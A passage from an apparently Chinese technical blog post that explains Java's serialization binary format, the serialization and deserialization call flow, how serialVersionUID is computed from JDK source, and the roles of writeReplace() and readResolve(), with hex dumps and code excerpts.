<li><code>0x02</code>，对象的序列化属性标志位，如是否是Block Data模式、自定义<code>writeObject()</code>，<code>Serializable</code>、<code>Externalizable</code>或<code>Enum</code>类型等</li>
<li><code>0x0002</code>，类的字段个数</li>
<li><code>0x49</code>，整数类型签名的第一个字节，同理，之后的<code>0x4c</code>为字符串类型签名的第一个字节 <font color="#0099ff">（类型签名表示与JVM规范中的定义相同）</font></li>
<li><code>0x0008...</code>，字段名字符串长度和值，非原始数据类型的字段还会在后面加上数据类型标识、完整类型签名长度和值，如之后的<code>0x740012...</code></li>
<li><code>0x78</code> Block Data结束标识</li>
<li><code>0x70</code> 父类描述符标识，此处为<code>null</code></li>
<li><code>0x00017df1</code> 整数字段<code>intField</code>的值 <em>（Java序列化中的整数格式标准）</em> ，非原始数据类型的字段则会按对象的方式处理，如之后的字符串字段<code>stringField</code>被识别为字符串类型，输出字符串类型标识、字符串长度和值</li>
</ul>
<p>由此可以看出，除了基本格式和一些整数表现形式上的不同之外，Java和PHP的序列化结果还是存在很多相似的地方，比如除了具体值外都会对类型进行描述。</p>
<p>需要注意的是，Java序列化中对字段进行封装时，会按原始和非原始数据类型排序 <em>（有同学可能想问为什么要这么做，这里我只能简单解释原因有两个，一是因为它们两个的表现形式不同，原始数据类型字段可以直接通过偏移量读取固定个数的字节来赋值；二是在封装时会计算原始类型字段的偏移量和总偏移量，以及非原始类型字段的个数，这使得反序列化阶段可以很方便的把原始和非原始数据类型分成两部分来处理）</em> ，且其中又会按字段名排序。</p>
<p>而开头固定的<code>0xaced0005</code>也可以作为Java序列化二进制串 <em>（Base64编码为<code>rO0AB...</code>）</em> 的识别标识。</p>
<hr>
<h3 id="让我们把这个对象再改复杂些："><a href="#让我们把这个对象再改复杂些：" class="headerlink" title="让我们把这个对象再改复杂些："></a>让我们把这个对象再改复杂些：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerializationSuperClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String superField;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SerializationComponentClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String componentField;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationDemo</span> <span class="keyword">extends</span> <span class="title">SerializationSuperClass</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> SerializationComponentClass component;</span><br><span class="line">    <span class="comment">// omit</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>它序列化后的二进制串大家可以自行消化理解一下，注意其中的嵌套对象，以及<code>0x71</code>表示的<code>Reference</code>类型标识 <em>（形式上与JVM的常量池类似，用于非原始数据类型的引用对象池索引，这个引用对象池在序列化和反序列化创建时的元素填充顺序会保持一致）</em> ：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">ac ed 00 05 73 72 00 11  53 65 72 69 61 6c 69 7a    ....sr.. Serializ</span><br><span class="line">61 74 69 6f 6e 44 65 6d  6f 1a 7f cd d3 53 6f 6b    ationDem o....Sok</span><br><span class="line">15 02 00 03 49 00 08 69  6e 74 46 69 65 6c 64 4c    ....I..i ntFieldL</span><br><span class="line">00 09 63 6f 6d 70 6f 6e  65 6e 74 74 00 1d 4c 53    ..compon entt..LS</span><br><span class="line">65 72 69 61 6c 69 7a 61  74 69 6f 6e 43 6f 6d 70    erializa tionComp</span><br><span class="line">6f 6e 65 6e 74 43 6c 61  73 73 3b 4c 00 0b 73 74    onentCla ss;L..st</span><br><span class="line">72 69 6e 67 46 69 65 6c  64 74 00 12 4c 6a 61 76    ringFiel dt..Ljav</span><br><span class="line">61 2f 6c 61 6e 67 2f 53  74 72 69 6e 67 3b 78 72    a&#x2F;lang&#x2F;S tring;xr</span><br><span class="line">00 17 53 65 72 69 61 6c  69 7a 61 74 69 6f 6e 53    ..Serial izationS</span><br><span class="line">75 70 65 72 43 6c 61 73  73 de c6 50 b7 d1 2f a3    uperClas s..P..&#x2F;.</span><br><span class="line">27 02 00 01 4c 00 0a 73  75 70 65 72 46 69 65 6c    &#39;...L..s uperFiel</span><br><span class="line">64 71 00 7e 00 02 78 70  70 00 01 7d f1 73 72 00    dq.~..xp p..&#125;.sr.</span><br><span class="line">1b 53 65 72 69 61 6c 69  7a 61 74 69 6f 6e 43 6f    .Seriali zationCo</span><br><span class="line">6d 70 6f 6e 65 6e 74 43  6c 61 73 73 3c 76 ba b7    mponentC lass&lt;v..</span><br><span class="line">dd 9e 76 c4 02 00 01 4c  00 0e 63 6f 6d 70 6f 6e    ..v....L ..compon</span><br><span class="line">65 6e 74 46 69 65 6c 64  71 00 7e 00 02 78 70 70    entField q.~..xpp</span><br><span class="line">74 00 05 67 79 79 79 79                             t..gyyyy</span><br></pre></td></tr></table></figure></div>

<p>简单的分析一下序列化的执行流程：</p>
<ol>
<li><code>ObjectOutputStream</code>实例初始化时，将魔术头和版本号写入<code>bout</code> <em>（<code>BlockDataOutputStream</code>类型）</em> 中</li>
<li>调用<code>ObjectOutputStream.writeObject()</code>开始写对象数据<ul>
<li><code>ObjectStreamClass.lookup()</code>封装待序列化的类描述 <em>（返回<code>ObjectStreamClass</code>类型）</em> ，获取包括类名、自定义<code>serialVersionUID</code>、可序列化字段 <em>（返回<code>ObjectStreamField</code>类型）</em> 和构造方法，以及<code>writeObject</code>、<code>readObject</code>方法等</li>
<li><code>writeOrdinaryObject()</code>写入对象数据<ul>
<li>写入对象类型标识</li>
<li><code>writeClassDesc()</code>进入分支<code>writeNonProxyDesc()</code>写入类描述数据<ul>
<li>写入类描述符标识</li>
<li>写入类名</li>
<li>写入SUID <em>（当SUID为空时，会进行计算并赋值，细节见下面关于SerialVersionUID章节）</em></li>
<li>计算并写入序列化属性标志位</li>
<li>写入字段信息数据</li>
<li>写入Block Data结束标识</li>
<li>写入父类描述数据</li>
</ul>
</li>
<li><code>writeSerialData()</code>写入对象的序列化数据<ul>
<li>若类自定义了<code>writeObject()</code>，则调用该方法写对象，否则调用<code>defaultWriteFields()</code>写入对象的字段数据 <em>（若是非原始类型，则递归处理子对象）</em></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<hr>
<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><h3 id="继续用简单的示例来看看反序列化："><a href="#继续用简单的示例来看看反序列化：" class="headerlink" title="继续用简单的示例来看看反序列化："></a>继续用简单的示例来看看反序列化：</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="keyword">byte</span>[] data; <span class="comment">// read from file or request</span></span><br><span class="line">    ByteArrayInputStream bin = <span class="keyword">new</span> ByteArrayInputStream(data);</span><br><span class="line">    ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(bin);</span><br><span class="line">    SerializationDemo demo = (SerializationDemo) in.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>它的执行流程如下：</p>
<ol>
<li><code>ObjectInputStream</code>实例初始化时，读取魔术头和版本号进行校验</li>
<li>调用<code>ObjectInputStream.readObject()</code>开始读对象数据<ul>
<li>读取对象类型标识</li>
<li><code>readOrdinaryObject()</code>读取数据对象<ul>
<li><code>readClassDesc()</code>读取类描述数据<ul>
<li>读取类描述符标识，进入分支<code>readNonProxyDesc()</code></li>
<li>读取类名</li>
<li>读取SUID</li>
<li>读取并分解序列化属性标志位</li>
<li>读取字段信息数据</li>
<li><code>resolveClass()</code>根据类名获取待反序列化的类的<code>Class</code>对象，如果获取失败，则抛出<code>ClassNotFoundException</code></li>
<li><code>skipCustomData()</code>循环读取字节直到Block Data结束标识为止</li>
<li>读取父类描述数据</li>
<li><code>initNonProxy()</code>中判断对象与本地对象的SUID和类名 <em>（不含包名）</em> 是否相同，若不同，则抛出<code>InvalidClassException</code></li>
</ul>
</li>
<li><code>ObjectStreamClass.newInstance()</code>获取并调用离对象最近的非<code>Serializable</code>的父类的无参构造方法 <em>（若不存在，则返回<code>null</code>）</em> 创建对象实例</li>
<li><code>readSerialData()</code>读取对象的序列化数据<ul>
<li>若类自定义了<code>readObject()</code>，则调用该方法读对象，否则调用<code>defaultReadFields()</code>读取并填充对象的字段数据</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<hr>
<h3 id="关于SerialVersionUID"><a href="#关于SerialVersionUID" class="headerlink" title="关于SerialVersionUID"></a>关于SerialVersionUID</h3><p>在Java的序列化机制中，SUID占据着很重要的位置，它相当于一个<code>对象的指纹信息</code>，可以直接决定反序列化的成功与否，通过上面对序列化和反序列化流程的分析也可以看出来，若SUID不一致，是无法反序列化成功的。</p>
<p>但是，SUID到底是如何生成的，它的指纹信息维度包括对象的哪些内容，可能还是有很多同学不太清楚。这里我们对照 <a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/class.html#a4100" target="_blank" rel="noopener">官方文档</a> 的说明，结合JDK的源代码来为大家简单的梳理一下。</p>
<p>首先<code>ObjectStreamClass.getSerialVersionUID()</code>在获取SUID时，会判断SUID是否已经存在，若不存在才调用<code>computeDefaultSUID()</code>计算默认的SUID：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">long</span> <span class="title">getSerialVersionUID</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (suid == <span class="keyword">null</span>) &#123;</span><br><span class="line">        suid = AccessController.doPrivileged(</span><br><span class="line">            <span class="keyword">new</span> PrivilegedAction&lt;Long&gt;() &#123;</span><br><span class="line">                <span class="function"><span class="keyword">public</span> Long <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> computeDefaultSUID(cl);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> suid.longValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>先顺带提一嘴，<code>AccessController.doPrivileged()</code>会忽略JRE配置的安全策略的检查，以特权的身份去执行<code>PrivilegedAction</code>接口中的<code>run()</code>，可以防止JDK底层在进行序列化和反序列化时可能出现的一些权限问题。这些内容与本文主题无关，不多作详细解释，感兴趣的同学可以去看看Java的Security包和其中的java.policy、java.security文件内容。</p>
<p>重点来了，计算SUID时，会先创建一个<code>DataOutputStream</code>对象，所有二进制数据写入其包装的<code>ByteArrayOutputStream</code>中：</p>
<ol>
<li>写入类名 <em>（UTF8）</em> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dout.writeUTF(cl.getName());</span><br></pre></td></tr></table></figure></div></li>
<li>写入类访问权限标识 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> classMods = cl.getModifiers() &amp;</span><br><span class="line">    (Modifier.PUBLIC | Modifier.FINAL |</span><br><span class="line">        Modifier.INTERFACE | Modifier.ABSTRACT);</span><br><span class="line"></span><br><span class="line">Method[] methods = cl.getDeclaredMethods();</span><br><span class="line"><span class="keyword">if</span> ((classMods &amp; Modifier.INTERFACE) != <span class="number">0</span>) &#123;</span><br><span class="line">    classMods = (methods.length &gt; <span class="number">0</span>) ?</span><br><span class="line">        (classMods | Modifier.ABSTRACT) :</span><br><span class="line">        (classMods &amp; ~Modifier.ABSTRACT);</span><br><span class="line">&#125;</span><br><span class="line">dout.writeInt(classMods);</span><br></pre></td></tr></table></figure></div></li>
<li>如果不是数组类型，写入实现接口的接口名，按接口名排序 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!cl.isArray()) &#123;</span><br><span class="line">    Class&lt;?&gt;[] interfaces = cl.getInterfaces();</span><br><span class="line">    String[] ifaceNames = <span class="keyword">new</span> String[interfaces.length];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; interfaces.length; i++) &#123;</span><br><span class="line">        ifaceNames[i] = interfaces[i].getName();</span><br><span class="line">    &#125;</span><br><span class="line">    Arrays.sort(ifaceNames);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ifaceNames.length; i++) &#123;</span><br><span class="line">        dout.writeUTF(ifaceNames[i]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>写入非私有静态或瞬态字段信息数据，包括字段名、字段访问权限标识和字段签名，按字段名排序 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields = cl.getDeclaredFields();</span><br><span class="line">MemberSignature[] fieldSigs = <span class="keyword">new</span> MemberSignature[fields.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fields.length; i++) &#123;</span><br><span class="line">    fieldSigs[i] = <span class="keyword">new</span> MemberSignature(fields[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(fieldSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ms1.name.compareTo(ms2.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; fieldSigs.length; i++) &#123;</span><br><span class="line">    MemberSignature sig = fieldSigs[i];</span><br><span class="line">    <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">        (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">            Modifier.STATIC | Modifier.FINAL | Modifier.VOLATILE |</span><br><span class="line">            Modifier.TRANSIENT);</span><br><span class="line">    <span class="keyword">if</span> (((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) ||</span><br><span class="line">        ((mods &amp; (Modifier.STATIC | Modifier.TRANSIENT)) == <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        dout.writeUTF(sig.name);</span><br><span class="line">        dout.writeInt(mods);</span><br><span class="line">        dout.writeUTF(sig.signature);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>如果存在类初始化器 <em>（不是类实例化的构造方法，感兴趣的同学可以去看看JVM规范中的相关内容）</em> ，写入固定的初始化器信息数据 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (hasStaticInitializer(cl)) &#123;</span><br><span class="line">    dout.writeUTF(<span class="string">"&lt;clinit&gt;"</span>);</span><br><span class="line">    dout.writeInt(Modifier.STATIC);</span><br><span class="line">    dout.writeUTF(<span class="string">"()V"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>写入非私有构造方法信息数据，包括方法名 <em>（固定为<code>&lt;init&gt;</code>）</em> 、方法访问权限标识和方法签名 <em>（分隔符<code>/</code>会替换成<code>.</code>的包名形式）</em> ，按方法签名排序 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt;[] cons = cl.getDeclaredConstructors();</span><br><span class="line">MemberSignature[] consSigs = <span class="keyword">new</span> MemberSignature[cons.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cons.length; i++) &#123;</span><br><span class="line">    consSigs[i] = <span class="keyword">new</span> MemberSignature(cons[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(consSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ms1.signature.compareTo(ms2.signature);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; consSigs.length; i++) &#123;</span><br><span class="line">    MemberSignature sig = consSigs[i];</span><br><span class="line">    <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">        (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">            Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">            Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">            Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">    <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">        dout.writeUTF(<span class="string">"&lt;init&gt;"</span>);</span><br><span class="line">        dout.writeInt(mods);</span><br><span class="line">        dout.writeUTF(sig.signature.replace(<span class="string">'/'</span>, <span class="string">'.'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></li>
<li>写入非私有方法，包括方法名、方法访问权限标识和方法签名，按方法名和方法签名排序 <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">MemberSignature[] methSigs = <span class="keyword">new</span> MemberSignature[methods.length];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methods.length; i++) &#123;</span><br><span class="line">    methSigs[i] = <span class="keyword">new</span> MemberSignature(methods[i]);</span><br><span class="line">&#125;</span><br><span class="line">Arrays.sort(methSigs, <span class="keyword">new</span> Comparator&lt;MemberSignature&gt;() &#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(MemberSignature ms1, MemberSignature ms2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> comp = ms1.name.compareTo(ms2.name);</span><br><span class="line">        <span class="keyword">if</span> (comp == <span class="number">0</span>) &#123;</span><br><span class="line">            comp = ms1.signature.compareTo(ms2.signature);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> comp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; methSigs.length; i++) &#123;</span><br><span class="line">    MemberSignature sig = methSigs[i];</span><br><span class="line">    <span class="keyword">int</span> mods = sig.member.getModifiers() &amp;</span><br><span class="line">        (Modifier.PUBLIC | Modifier.PRIVATE | Modifier.PROTECTED |</span><br><span class="line">            Modifier.STATIC | Modifier.FINAL |</span><br><span class="line">            Modifier.SYNCHRONIZED | Modifier.NATIVE |</span><br><span class="line">            Modifier.ABSTRACT | Modifier.STRICT);</span><br><span class="line">    <span class="keyword">if</span> ((mods &amp; Modifier.PRIVATE) == <span class="number">0</span>) &#123;</span><br><span class="line">        dout.writeUTF(sig.name);</span><br><span class="line">        dout.writeInt(mods);</span><br><span class="line">        dout.writeUTF(sig.signature.replace(<span class="string">'/'</span>, <span class="string">'.'</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

</li>
</ol>
<p>以上就是SUID中包含的类的所有信息，得到的二进制串如下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">00 11 53 65 72 69 61 6c  69 7a 61 74 69 6f 6e 44    ..Serial izationD</span><br><span class="line">65 6d 6f 00 00 00 01 00  14 6a 61 76 61 2e 69 6f    emo..... .java.io</span><br><span class="line">2e 53 65 72 69 61 6c 69  7a 61 62 6c 65 00 08 69    .Seriali zable..i</span><br><span class="line">6e 74 46 69 65 6c 64 00  00 00 02 00 01 49 00 0b    ntField. .....I..</span><br><span class="line">73 74 72 69 6e 67 46 69  65 6c 64 00 00 00 02 00    stringFi eld.....</span><br><span class="line">12 4c 6a 61 76 61 2f 6c  61 6e 67 2f 53 74 72 69    .Ljava&#x2F;l ang&#x2F;Stri</span><br><span class="line">6e 67 3b 00 06 3c 69 6e  69 74 3e 00 00 00 01 00    ng;..&lt;in it&gt;.....</span><br><span class="line">16 28 4c 6a 61 76 61 2e  6c 61 6e 67 2e 53 74 72    .(Ljava. lang.Str</span><br><span class="line">69 6e 67 3b 49 29 56 00  04 6d 61 69 6e 00 00 00    ing;I)V. .main...</span><br><span class="line">09 00 16 28 5b 4c 6a 61  76 61 2e 6c 61 6e 67 2e    ...([Lja va.lang.</span><br><span class="line">53 74 72 69 6e 67 3b 29  56                         String;)V</span><br></pre></td></tr></table></figure></div>

<p>最后，将二进制数据通过SHA1算法得到摘要，取前8位按BigEndian的字节顺序转换成长整型：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">long</span> hash = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = Math.min(hashBytes.length, <span class="number">8</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">    hash = (hash &lt;&lt; <span class="number">8</span>) | (hashBytes[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>返回的<code>hash</code>就是最终的SUID了。</p>
<p>由此可知，当父类或非原始数据类型字段的类内部发生变更时，并不会影响当前类的SUID值，再结合之前的内容我们还可以引申出两个结论：</p>
<ol>
<li>若当前类自定义了<code>readObject()</code>，在反序列化时会正常执行<code>readObject()</code>中所有<code>ObjectInputStream.defaultReadObject()</code> <em>（如果调用了的话）</em> 之前的逻辑；否则在处理到变更对象时，仍会抛出<code>InvalidClassException</code></li>
<li>由于序列化会对类的字段进行排序，并在反序列化时按顺序遍历处理，所以反序列化会正常处理字段名比变更对象类型字段『小』的其他字段</li>
</ol>
<h3 id="关于writeReplace-和readResolve"><a href="#关于writeReplace-和readResolve" class="headerlink" title="关于writeReplace()和readResolve()"></a>关于<code>writeReplace()</code>和<code>readResolve()</code></h3><p>在前面的执行流程分析中，为了突出主要逻辑，我们主观的忽略了一些内容，其中就包括了序列化的<code>invokeWriteReplace()</code>和反序列化的<code>invokeReadResolve()</code>。</p>
<p>现在就来看看它们分别有什么作用：</p>
<ul>
<li><p><code>writeReplace()</code></p>
<p>  返回一个对象，该对象为实际被序列化的对象，在原对象序列化之前被调用，替换原对象成为待序列化对象</p>
</li>
<li><p><code>readResolve()</code></p>
<p>  返回一个对象，该对象为实际反序列化的结果对象，在原对象反序列化之后被调用，不影响原对象的反序列化过程，仅替换结果</p>
</li>
</ul>
<p>再从具体示例来体会一下：</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializationReplacementClass</span> <span class="keyword">implements</span> <span 